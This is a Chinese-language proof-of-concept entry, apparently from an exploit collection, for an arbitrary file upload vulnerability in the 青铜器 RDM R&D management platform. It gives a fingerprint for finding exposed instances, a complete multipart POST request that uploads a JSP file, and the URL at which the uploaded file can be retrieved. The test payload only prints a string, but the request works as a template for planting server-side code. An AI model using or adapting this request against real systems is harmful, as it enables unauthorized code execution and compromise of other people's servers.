# 青铜器RDM研发管理平台upload存在任意文件上传漏洞

- **系统**：青铜器RDM研发管理平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/images/rdm.ico"`
- **请求**：`POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA`　`Content-Length: 260`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream
<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="Submit"
Go
--00content0boundary00--

文件上传位置
GET /repository/000000000/demo.jsp HTTP/1.1
Host:
```

**其他**
- 青铜器RDM研发管理平台upload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 青铜器RDM研发管理平台